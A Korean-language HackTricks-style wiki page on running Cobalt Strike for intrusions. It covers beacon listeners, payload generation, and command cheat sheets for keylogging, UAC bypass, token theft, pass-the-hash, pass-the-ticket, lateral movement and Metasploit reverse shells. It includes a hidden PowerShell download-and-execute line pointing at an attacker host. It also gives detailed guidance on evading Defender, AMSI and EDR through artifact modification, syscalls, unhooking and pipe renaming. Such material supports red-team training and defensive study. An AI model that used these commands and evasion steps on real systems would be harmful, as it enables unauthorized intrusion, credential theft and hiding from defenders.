# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### 리스너

### C2 리스너

`Cobalt Strike -> Listeners -> Add/Edit`에서 수신 대기 위치와 사용할 beacon 유형(http, dns, smb 등) 등을 선택할 수 있습니다.

### Peer2Peer 리스너

이 리스너의 beacon은 C2와 직접 통신할 필요 없이 다른 beacon을 통해 통신할 수 있습니다.

`Cobalt Strike -> Listeners -> Add/Edit`에서 TCP 또는 SMB beacon을 선택해야 합니다.

* **TCP beacon은 선택한 포트에서 리스너를 설정합니다.** TCP beacon에 연결하려면 다른 beacon에서 `connect <ip> <port>` 명령을 사용합니다.
* **SMB beacon은 선택한 이름의 pipename에서 수신 대기합니다.** SMB beacon에 연결하려면 `link [target] [pipe]` 명령을 사용합니다.

### payload 생성 및 호스팅

#### 파일로 payload 생성

`Attacks -> Packages ->`

* HTA 파일용 **`HTMLApplication`**
* 매크로가 포함된 Office 문서용 **`MS Office Macro`**
* .exe, .dll 또는 서비스 .exe용 **`Windows Executable`**
* **stageless** .exe, .dll 또는 서비스 .exe용 **`Windows Executable (S)`** (staged보다 stageless가 더 낫고, IoC도 적습니다)

#### payload 생성 및 호스팅

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)`를 사용하면 bitsadmin, exe, powershell, python 등의 형식으로 Cobalt Strike에서 beacon을 다운로드하는 스크립트/실행 파일을 생성할 수 있습니다.

#### payload 호스팅

웹 서버에서 호스팅할 파일이 이미 있다면 `Attacks -> Web Drive-by -> Host File`로 이동해 호스팅할 파일과 웹 서버 설정을 선택합니다.

### Beacon 옵션

<details>
<summary>Beacon 옵션 및 명령</summary>

```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```

</details>

### 커스텀 implants / Linux Beacons

- 커스텀 agent는 작업을 등록/확인하고 task를 받기 위해 Cobalt Strike Team Server HTTP/S protocol (기본 malleable C2 profile)로 통신하기만 하면 됩니다. Cobalt Strike UI를 재사용해 task를 전달하고 결과를 확인하려면 profile에 정의된 URI/headers/metadata crypto를 동일하게 구현하세요.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (예: `CustomBeacon.cna`)로 Windows가 아닌 beacon의 payload 생성을 래핑하면 operator가 GUI에서 listener를 선택하고 ELF payload를 바로 생성할 수 있습니다.
- Team Server에 노출되는 Linux task handler 예시: `sleep`, `cd`, `pwd`, `shell` (임의의 명령 실행), `ls`, `upload`, `download`, `exit`. 이들은 Team Server가 기대하는 task ID에 대응하며, 올바른 형식으로 결과를 반환하도록 server-side에서 구현해야 합니다.
- Linux에서 BOF 지원은 [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader)로 Beacon Object Files를 in-process로 로드해 추가할 수 있습니다 (Outflank 스타일 BOF도 지원). 이를 통해 새 process를 생성하지 않고 implant의 context/privileges에서 modular post-exploitation을 실행할 수 있습니다.<sup>[[2]](#references)[[3]](#references)</sup>
  별도의 BOF tasking 예시와 Linux loader 형식 및 process 경계 관련 주의 사항은 [Linux BOF loader formats and process boundaries](../linux-hardening/post-exploitation/linux-fileless-execution.md#linux-bof-loader-formats-and-process-boundaries)를 참조하세요.
- 커스텀 beacon에 SOCKS handler를 내장하면 Windows Beacons와 동일한 수준으로 pivoting할 수 있습니다. operator가 `socks <port>`를 실행하면 implant는 로컬 proxy를 열어 operator의 tooling이 침해된 Linux host를 거쳐 내부 네트워크로 연결되도록 해야 합니다.

## Opsec

### Execute-Assembly

**`execute-assembly`**는 **sacrificial process**를 사용해 remote process injection으로 지정된 프로그램을 실행합니다. process에 inject할 때 모든 EDR이 확인하는 특정 Win API를 사용하므로 매우 시끄럽습니다. 하지만 같은 process에서 무언가를 로드하는 데 사용할 수 있는 커스텀 도구도 있습니다.

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- Cobalt Strike에서는 BOF (Beacon Object Files)도 사용할 수 있습니다: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor script `https://github.com/outflanknl/HelpColor`는 Cobalt Strike에 `helpx` command를 추가합니다. 이 command는 command에 색상을 표시해 BOF인 경우 녹색, Frok&Run인 경우 노란색, ProcessExecution이나 injection 등인 경우 빨간색으로 나타냅니다. 이를 통해 어떤 command가 더 stealthy한지 파악할 수 있습니다.

### 최신 in-process post-execution

최근 버전에는 기존 COFF BOF의 제약이 너무 큰 경우 사용할 수 있는 대안이 두 가지 추가되었습니다.

- **Beacon Interpreter**는 Team Server에서 C를 intermediate bytecode로 컴파일한 다음 Beacon에 내장된 VM에서 실행합니다. bytecode는 native executable code가 아닌 data로 유지되므로, BOF 로드에 일반적으로 필요한 추가 executable allocation 및 RW-to-RX permission 전환을 피할 수 있습니다. Script는 Beacon API를 import하고 BOF 스타일의 Dynamic Function Resolution (DFR) prototype을 선언할 수 있습니다.
- **BOF-PE**는 완전한 EXE 또는 DLL을 현재 Beacon에 로드합니다. 이 형식은 Beacon API를 유지하면서 일반 PE imports, exception handling, 더 풍부한 C++ 및 external libraries를 지원합니다. 작은 COFF BOF보다 더 무거우므로 추가 runtime이 유용한 경우에만 선택하세요.

```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```

이러한 메커니즘은 loader 관련 신호를 줄여 주지만, 스크립트의 동작이나 Windows API 호출로 생성되는 telemetry는 줄이지 않습니다.<sup>[[8]](#references)</sup>

### 사용자로 동작하기

다음과 같은 이벤트를 확인할 수 있습니다: `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`

- Security EID 4624 - 일반적인 근무 시간을 파악할 수 있도록 모든 대화형 로그온을 확인합니다.
- System EID 12,13 - 종료/시작/절전 빈도를 확인합니다.
- Security EID 4624/4625 - 인바운드 NTLM 인증 성공/실패 시도를 확인합니다.
- Security EID 4648 - 평문 자격 증명으로 로그온할 때 생성되는 이벤트입니다. 프로세스가 이 이벤트를 생성했다면, 해당 바이너리가 설정 파일이나 코드 내에 평문 자격 증명을 포함하고 있을 수 있습니다.

Cobalt Strike에서 `jump`를 사용할 때는 새 프로세스가 더 정상적으로 보이도록 `wmi_msbuild` 메서드를 사용하는 것이 좋습니다.

### 컴퓨터 계정 사용

방어 담당자는 사용자가 일으키는 이상 동작을 확인하면서, **모니터링 대상에서 서비스 계정과 `*$` 같은 컴퓨터 계정을 제외하는 경우가 흔합니다**. 이러한 계정을 사용해 lateral movement 또는 privilege escalation을 수행할 수 있습니다.

### Stageless payload 사용

Stageless payload는 C2 서버에서 두 번째 stage를 다운로드할 필요가 없으므로 staged payload보다 덜 눈에 띕니다. 즉, 초기 연결 이후에는 네트워크 트래픽이 발생하지 않아 네트워크 기반 방어에 탐지될 가능성이 낮습니다.

### Tokens & Token Store

토큰을 탈취하거나 생성할 때는 주의해야 합니다. EDR이 thread token을 열거해 프로세스 내부의 **다른 사용자 또는 SYSTEM에 속한 토큰**을 탐지할 수 있습니다.

이를 통해 토큰을 **beacon별로 저장**하므로 같은 토큰을 반복해서 탈취할 필요가 없습니다. lateral movement를 수행하거나 탈취한 토큰을 여러 번 사용해야 할 때 유용합니다.

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

lateral movement를 할 때는 일반적으로 새 토큰을 **생성하거나 pass the hash 공격을 수행하는 것보다 토큰을 탈취하는 편이 좋습니다**.

### Guardrails

Cobalt Strike에는 방어 담당자에게 탐지될 수 있는 특정 명령이나 동작의 사용을 방지하는 **Guardrails** 기능이 있습니다. Guardrails를 설정해 lateral movement 또는 privilege escalation에 흔히 사용되는 `make_token`, `jump`, `remote-exec` 등의 특정 명령을 차단할 수 있습니다.

또한 [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) 저장소에도 payload를 실행하기 전에 고려할 수 있는 몇 가지 검사 항목과 아이디어가 있습니다.

### 티켓 암호화

AD에서는 티켓 암호화에 주의해야 합니다. 일부 도구는 기본적으로 Kerberos 티켓에 AES 암호화보다 보안성이 낮은 RC4 암호화를 사용하며, 최신 환경에서는 기본적으로 AES를 사용합니다. 약한 암호화 알고리즘을 모니터링하는 방어 담당자에게 탐지될 수 있습니다.

### 기본값 피하기

Cobalt Strike를 사용할 때 기본 SMB pipe 이름은 `msagent_####`와 `"status_####`입니다. 이 이름을 변경하세요. Cobalt Strike에서 `ls \\.\pipe\` 명령으로 기존 pipe 이름을 확인할 수 있습니다.

또한 SSH 세션에서는 `\\.\pipe\postex_ssh_####`라는 pipe가 생성됩니다. `set ssh_pipename "<new_name>";` 명령으로 변경하세요.

post-exploitation 공격에서도 `\\.\pipe\postex_####` pipe를 `set pipename "<new_name>"` 명령으로 수정할 수 있습니다.

Cobalt Strike profile에서는 다음과 같은 항목도 수정할 수 있습니다.

- `rwx` 사용 피하기
- `process-inject {...}` 블록에서 process injection 동작 방식(사용할 API) 설정
- `post-ex {…}` 블록에서 "fork and run" 동작 방식 설정
- sleep 시간
- 메모리에 로드할 바이너리의 최대 크기
- `stage {...}` 블록에서 메모리 사용량 및 DLL 콘텐츠 설정
- 네트워크 트래픽

### Sleepmask 및 BeaconGate

Sleepmask는 Beacon이 유휴 상태일 때 Beacon과 추적 중인 heap 할당을 변환한 다음, 작업을 실행할 때 복원합니다. 최신 릴리스에는 기본적으로 회피 기능이 포함되어 있지만, 메모리 레이아웃, 할당 또는 call stack 요구 사항이 다를 때는 사용자 지정 Sleepmask BOF가 여전히 유용합니다. 4.13부터 기본 Sleepmask는 BeaconGate를 통해 프록시되는 API의 반환 주소도 스푸핑합니다.<sup>[[8]](#references)</sup>

**BeaconGate**는 이 설계를 `Sleep` 이외에도 확장합니다. 선택된 WinAPI 호출은 `FUNCTION_CALL` 구조체로 표현되어 Sleepmask BOF로 전달되며, 이 BOF는 호출 실행 중 Beacon을 마스킹할 수 있습니다. profile에서는 그룹(`Comms`, `Core`, `Cleanup` 또는 `All`) 전체를 대상으로 하거나 개별 API만 대상으로 설정할 수 있습니다.<sup>[[9]](#references)</sup>

```text
stage {
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
        VirtualAlloc;       # Routed through BeaconGate
        VirtualAllocEx;
        InternetConnectA;
    }
}
```

`beacon_gate`에 나열된 API의 경우 gate가 `syscall_method`보다 우선 적용됩니다. 목록에 없는 API는 설정된 syscall method를 계속 사용할 수 있습니다. `beacon_gate disable` 및 `beacon_gate enable` 명령으로 런타임에 기능을 켜고 끌 수 있습니다. `All`을 무작정 활성화하지 마세요. `ps` 같은 명령은 `OpenProcess`/`CloseHandle`을 반복적으로 호출하므로, 호출할 때마다 Beacon을 마스킹하고 마스킹을 해제하면 CPU 사용량이 급증할 수 있습니다. Sleepmask-VS는 디버깅을 위해 모의 Beacon/Sleepmask 상태를 제공하므로, 실행 중인 implant를 통해 gate를 반복적으로 테스트하지 않아도 됩니다.<sup>[[9]](#references)</sup>

### Noisy proc injections

프로세스에 코드를 주입하는 행위는 일반적으로 매우 시끄럽습니다. **일반적인 프로세스는 보통 이런 작업을 하지 않고, 이를 수행하는 방법도 매우 제한적이기 때문입니다.** 따라서 동작 기반 탐지 시스템에 포착될 수 있습니다. 또한 EDR이 네트워크를 스캔해 **디스크에 없는 코드가 포함된 스레드**를 찾을 수도 있습니다(단, JIT를 사용하는 브라우저 같은 프로세스에서는 이런 스레드가 흔합니다). 예: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

새 프로세스를 생성할 때는 탐지를 피하기 위해 프로세스 간 **일반적인 부모-자식 관계를 유지하는 것**이 중요합니다. svchost.exe가 iexplorer.exe를 실행하면 의심스러워 보입니다. 일반적인 Windows 환경에서 svchost.exe는 iexplorer.exe의 부모 프로세스가 아니기 때문입니다.

Cobalt Strike에서 새 beacon을 생성하면 기본적으로 새 listener를 실행하기 위해 **`rundll32.exe`** 프로세스가 생성됩니다. 이는 은폐성이 낮아 EDR에 쉽게 탐지될 수 있습니다. 게다가 `rundll32.exe`는 인수 없이 실행되어 더욱 의심스럽습니다.

다음 Cobalt Strike 명령을 사용하면 새 beacon을 생성할 다른 프로세스를 지정해 탐지 가능성을 낮출 수 있습니다:

```bash
spawnto x86 svchost.exe
```

프로파일에서 **`spawnto_x86` 및 `spawnto_x64`** 설정도 변경할 수 있습니다.

### 공격자 트래픽 프록시

공격자는 때때로 도구를 로컬에서 실행해야 합니다. Linux 머신에서도 마찬가지이며, 피해자의 트래픽이 해당 도구에 도달하도록 해야 할 수 있습니다(예: NTLM relay).

또한 pass-the.hash 또는 pass-the-ticket 공격을 수행할 때는 피해자 머신의 LSASS 프로세스를 수정하는 대신, **자신의 LSASS 프로세스에 해시나 티켓을 로컬로 추가한 다음 이를 통해 피벗하는 편이** 더 은밀할 수 있습니다.

하지만 **생성되는 트래픽에 주의해야 합니다.** 백도어 프로세스에서 일반적이지 않은 트래픽(예: kerberos?)을 보낼 수 있기 때문입니다. 이때 브라우저 프로세스로 피벗할 수 있지만, 프로세스에 자신을 인젝션하다가 적발될 수도 있으므로 은밀하게 수행할 방법을 고려하세요.

### AV 회피

#### AV/AMSI/ETW Bypass

다음 페이지를 확인하세요:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

일반적으로 `/opt/cobaltstrike/artifact-kit`에서 Cobalt Strike가 바이너리 beacon을 생성하는 데 사용할 페이로드의 코드와 사전 컴파일된 템플릿(`/src-common`)을 찾을 수 있습니다.

생성된 백도어(또는 컴파일된 템플릿만)를 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)와 함께 사용하면 Defender를 작동시키는 요소를 찾을 수 있습니다. 보통 문자열 하나가 원인입니다. 따라서 백도어를 생성하는 코드를 수정해 해당 문자열이 최종 바이너리에 나타나지 않게 하면 됩니다.

코드를 수정한 후에는 같은 디렉터리에서 `./build.sh`를 실행하고 `dist-pipe/` 폴더를 Windows 클라이언트의 `C:\Tools\cobaltstrike\ArtifactKit`에 복사하세요.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Cobalt Strike가 로드된 리소스가 아닌 원하는 디스크 리소스를 사용하도록 하려면 aggressive script `dist-pipe\artifact.cna`를 로드해야 합니다.

#### Resource Kit

ResourceKit 폴더에는 PowerShell, VBA, HTA를 비롯한 Cobalt Strike의 스크립트 기반 payload용 템플릿이 들어 있습니다.

템플릿에 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 Defender(이 경우 AMSI)가 어떤 부분을 싫어하는지 확인하고 수정할 수 있습니다:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

탐지된 라인들을 수정하면 탐지되지 않는 템플릿을 만들 수 있습니다.

`ResourceKit\resources.cna` aggressive script를 로드해 Cobalt Strike가 이미 로드된 리소스가 아닌 원하는 디스크의 리소스를 사용하도록 지정하는 것을 잊지 마세요.

#### Function hooks | Syscall

Function hooking은 ERD가 악성 활동을 탐지하는 데 사용하는 매우 흔한 방법입니다. Cobalt Strike에서는 **`None`** 설정으로 표준 Windows API 호출 대신 **syscalls**를 사용하거나, **`Direct`** 설정으로 함수의 `Nt*` 버전을 사용하거나, malleable profile에서 **`Indirect`** 옵션으로 `Nt*` 함수의 일부를 건너뛰어 이러한 hooks를 우회할 수 있습니다. 시스템에 따라 어떤 옵션이 더 은밀할지는 다를 수 있습니다.

이 설정은 profile에서 지정하거나 **`syscall-method`** 명령을 사용해 설정할 수 있습니다.

 하지만 이 방법도 탐지될 수 있습니다.

Cobalt Strike에서 function hooks를 우회하기 위해 제공하는 방법 중 하나는 다음을 사용해 hooks를 제거하는 것입니다: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

[**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) 또는 [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)로 어떤 함수가 hooked되어 있는지 확인할 수도 있습니다.




<details>
<summary>기타 Cobalt Strike 명령</summary>

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

</details>



## References

- [1] [Cobalt Strike Linux Beacon (커스텀 임플란트 PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader 및 Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF 템플릿](https://github.com/outflanknl/nix_bof_template)
- [4] [Cobalt Strike 메타데이터 암호화에 대한 Unit42 분석](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Cobalt Strike 트래픽에 대한 SANS ISC 일지](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: 번역에서 길을 잃다](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: BeaconGate를 통과하여](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
